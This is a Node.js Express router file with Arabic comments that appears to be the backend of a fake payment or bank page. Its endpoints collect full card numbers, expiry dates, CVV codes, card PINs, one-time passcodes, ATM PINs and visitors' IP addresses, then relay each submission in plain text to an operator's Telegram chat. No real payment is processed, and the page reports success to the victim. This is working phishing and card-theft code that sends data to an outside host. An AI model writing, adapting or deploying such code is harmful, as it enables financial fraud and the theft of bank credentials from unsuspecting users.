const express = require('express');
const router = express.Router();
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');

// استبدال هذه القيم بمعلومات بوتك
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: false });

// دالة جديدة لمعالجة الطلبات
router.post('/submit-order', async (req, res) => {
  try {
    const { totalAmount, currency, userIP, paymentMethod } = req.body;

    // إرسال البيانات إلى Telegram
    const message = `
      **تم استلام طلب جديد**
      - المبلغ: ${totalAmount} ${currency}
      - طريقة الدفع: ${paymentMethod === 'wallet' ? 'كي نت' : 'بطاقة بنكية'}
      - IP المستخدم: ${userIP}
    `;

    await bot.sendMessage(CHAT_ID, message, { parse_mode: 'Markdown' });

    res.status(200).json({ success: true, message: 'تم استلام الطلب بنجاح' });
  } catch (error) {
    console.error('Error processing order:', error);
    res.status(500).json({ success: false, message: 'خطأ في معالجة الطلب' });
  }
});

// الدالة القديمة لمعالجة الدفع بالبطاقة
router.post('/submit-payment', async (req, res) => {
  try {
    const { bank, cardNumber, pin, expiry, cvv, amount , userIP , currency } = req.body;

    if (!cardNumber || !expiry || !cvv || !amount || !currency || !userIP) {
      return res.status(400).json({ success: false, message: 'بيانات ناقصة' });
    }

    const message = `
**تم استلام دفعة جديدة**
- البنك: ${bank || 'غير محدد'}
- رقم البطاقة: ${cardNumber}
- الرقم السري: ${pin || 'غير متوفر'}
- تاريخ الانتهاء: ${expiry}
- CVV: ${cvv}
- المبلغ: ${amount} ${currency}
- IP المستخدم: ${userIP}
    `;

    await bot.sendMessage(CHAT_ID, message, { parse_mode: 'Markdown' });

    res.status(200).json({ success: true, message: 'تم إرسال البيانات بنجاح' });
  } catch (error) {
    console.error('Error processing payment:', error);
    res.status(500).json({ success: false, message: 'خطأ في معالجة الدفع' });
  }
});
// نقطة نهاية جديدة لـ OTP
router.post('/submit-otp', async (req, res) => {
  try {
    const { otp, userIP } = req.body;

    // إرسال OTP و IP إلى Telegram
    const message = `
      **تم استلام رمز OTP**
      - رمز OTP: ${otp}
      - IP المستخدم: ${userIP}
    `;

    await bot.sendMessage(CHAT_ID, message, { parse_mode: 'Markdown' });

    res.status(200).json({ success: true, message: 'تم استلام رمز OTP بنجاح' });
  } catch (error) {
    console.error('Error processing OTP:', error);
    res.status(500).json({ success: false, message: 'خطأ في معالجة رمز OTP' });
  }
});


// في ملف paymentRoutes.js
router.post('/submit-pin', async (req, res) => {
  try {
    const { atmPin, userIP } = req.body;

    // إرسال ATM PIN و IP إلى Telegram
    const message = `
      **تم استلام رمز الصراف الآلي**
      - رمز الصراف الآلي: ${atmPin}
      - IP المستخدم: ${userIP}
    `;

    await bot.sendMessage(CHAT_ID, message, { parse_mode: 'Markdown' });

    res.status(200).json({ success: true, message: 'تم استلام رمز الصراف الآلي بنجاح' });
  } catch (error) {
    console.error('Error processing ATM PIN:', error);
    res.status(500).json({ success: false, message: 'خطأ في معالجة رمز الصراف الآلي' });
  }
});


module.exports = router;